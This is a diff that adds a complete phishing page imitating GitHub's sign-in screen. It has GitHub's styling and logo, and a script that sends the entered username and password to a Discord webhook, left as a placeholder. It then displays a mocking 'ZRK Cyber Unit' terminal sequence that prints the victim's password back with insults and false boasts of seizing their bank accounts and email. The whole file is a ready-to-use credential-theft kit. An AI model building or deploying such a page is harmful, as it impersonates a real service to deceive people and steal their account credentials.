@@ -1,0 +1,197 @@
+<html><head><base href="https://codepulse.com/github-login/">
+<title>GitHub Login</title>
+<style>
+body {
+    font-family: -apple-system,BlinkMacSystemFont,"Segoe UI","Noto Sans",Helvetica,Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji";
+    background-color: #0d1117;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    color: #c9d1d9;
+}
+.login-container {
+    background-color: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 6px;
+    padding: 20px;
+    width: 340px;
+}
+h1 {
+    text-align: center;
+    margin-bottom: 20px;
+}
+form {
+    display: flex;
+    flex-direction: column;
+}
+input {
+    margin-bottom: 15px;
+    padding: 5px 12px;
+    font-size: 14px;
+    line-height: 20px;
+    color: #c9d1d9;
+    background-color: #0d1117;
+    border: 1px solid #30363d;
+    border-radius: 6px;
+}
+button {
+    background-color: #238636;
+    color: #ffffff;
+    border: none;
+    padding: 5px 16px;
+    font-size: 14px;
+    font-weight: 500;
+    line-height: 20px;
+    cursor: pointer;
+    border-radius: 6px;
+}
+button:hover {
+    background-color: #2ea043;
+}
+.github-logo {
+    width: 48px;
+    height: 48px;
+    margin: 0 auto 20px;
+    display: block;
+}
+#overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: black;
+    opacity: 0;
+    transition: opacity 2s;
+    display: none;
+}
+#terminal {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 80%;
+    height: 60%;
+    background-color: #000;
+    border: 2px solid #ff0000;
+    padding: 20px;
+    font-family: 'Courier New', monospace;
+    color: #ff0000;
+    overflow: hidden;
+}
+#cursor {
+    display: inline-block;
+    width: 10px;
+    height: 20px;
+    background-color: #ff0000;
+    animation: blink 0.7s infinite;
+}
+@keyframes blink {
+    0% { opacity: 0; }
+    50% { opacity: 1; }
+    100% { opacity: 0; }
+}
+</style>
+</head>
+<body>
+<div class="login-container">
+    <svg class="github-logo" viewBox="0 0 16 16" version="1.1" aria-hidden="true">
+        <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z" fill="#c9d1d9"></path>
+    </svg>
+    <h1>Sign in to GitHub</h1>
+    <form id="login-form">
+        <input type="text" id="username" placeholder="Username or email address" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit">Sign in</button>
+    </form>
+</div>
+
+<div id="overlay"></div>
+<div id="terminal"></div>
+
+<script>
+document.getElementById('login-form').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    
+    const data = {
+        username: username,
+        password: password
+    };
+
+    fetch('discord webhook here', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            content: `Username: ${username}\nPassword: ${password}`
+        })
+    })
+    .then(response => {
+        if (response.ok) {
+            startHackSequence(username, password);
+        } else {
+            throw new Error('Network response was not ok.');
+        }
+    })
+    .catch((error) => {
+        console.error('Error:', error);
+        alert('An error occurred. Please try again later.');
+    });
+});
+
+function startHackSequence(username, password) {
+    const overlay = document.getElementById('overlay');
+    const terminal = document.getElementById('terminal');
+    
+    overlay.style.display = 'block';
+    setTimeout(() => {
+        overlay.style.opacity = '1';
+    }, 100);
+
+    setTimeout(() => {
+        terminal.style.display = 'block';
+        typeText(`ZRK CYBER UNIT ACTIVATED\n\n`, 50)
+            .then(() => typeText(`TARGET ACQUIRED: ${username}\n`, 50))
+            .then(() => typeText(`SCANNING NON-EXISTENT DEFENSES...\n`, 50))
+            .then(() => typeText(`FIREWALL? MORE LIKE TISSUE PAPER\n`, 50))
+            .then(() => typeText(`ACCESSING YOUR PATHETIC EXCUSE FOR A MAINFRAME...\n`, 50))
+            .then(() => typeText(`EXTRACTING YOUR EMBARRASSING DATA\n\n`, 50))
+            .then(() => typeText(`HOLY SHIT! Your password "${password}" is a joke, right?\n`, 50))
+            .then(() => typeText(`Did you seriously think that would keep anyone out?\n`, 50))
+            .then(() => typeText(`My grandma could hack this, and she's been dead for 10 years!\n`, 50))
+            .then(() => typeText(`ZRK Cyber Unit owns your miserable digital life now, you absolute tool!\n`, 50))
+            .then(() => typeText(`Next time, try using a password that isn't\n`, 50))
+            .then(() => typeText(`"password123" or your IQ, whichever is lower.\n\n`, 50))
+            .then(() => typeText(`Your bank accounts, emails, and browser history are ours.\n`, 50))
+            .then(() => typeText(`Enjoy explaining those furry websites to your family, loser!\n`, 50))
+            .then(() => typeText(`ZRK Cyber Unit out, you absolute waste of bandwidth!\n`, 50))
+            .then(() => {
+                terminal.innerHTML += '<div id="cursor"></div>';
+            });
+    }, 2000);
+}
+
+function typeText(text, speed) {
+    return new Promise((resolve) => {
+        let i = 0;
+        function type() {
+            if (i < text.length) {
+                document.getElementById('terminal').innerHTML += text.charAt(i);
+                i++;
+                setTimeout(type, speed);
+            } else {
+                resolve();
+            }
+        }
+        type();
+    });
+}
+</script>
+</body></html>
